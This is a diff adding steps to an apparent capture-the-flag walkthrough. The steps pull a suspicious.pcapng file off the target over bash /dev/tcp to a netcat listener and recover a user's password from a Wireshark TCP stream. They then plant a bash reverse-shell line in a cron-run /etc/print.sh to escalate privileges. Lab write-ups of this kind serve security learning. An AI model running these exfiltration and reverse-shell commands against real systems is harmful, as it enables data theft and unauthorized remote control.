@@ -139,3 +139,40 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 We find a directory called Incidents
 Inside it we find an interesting file named suspicious.pcapng
 
+
+WE NEED TO DOWNLOAD THIS FILE TO ANALYSE IT FURTHER IN WIRESHARK
+LETS DOWNLOAD IT VIA AN NC LISTENER
+nc -lvnp 1235 > file.pcap      - run this on the attackers machine
+bash -c 'cat suspcious.pcapng > /dev/tcp/[ATTACKIP]/1235'
+
+suspicious.pcapng will now be saved on our attacking machine as file.pcap!
+
+In WIRESHARK if we analyse file.pcap we can show the TCP stream of sequence 7:
+tcp.stream eq 7        - the filter to use
+then follow the TCP stream
+
+With this we can find the password for Lennie:
+c4ntg3t3n0ughsp1c3
+
+su Lennie
+log in as Lennie
+get the user.txt flag!
+
+on Lennies /home/lennie/scripts directory we can find the script - planner.sh
+
+echo $LIST > /home/lennie/scripts/startup_list.txt
+/etc/print.sh
+
+this script will execute /etc/print.sh
+
+set up a netcat listener on your attacking machine:
+nc -lvnp 4444
+on the target machine edit and add to the /etc/print.sh file with the following:
+
+echo "bash -i >& /dev/tcp/10.10.64.206/4444 0>&1" >> print.sh    - got the reverse shell from https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+Wait for the print.sh to update    (startup_list txt runs every minute as we found out with ls -la command)
+
+
+
+
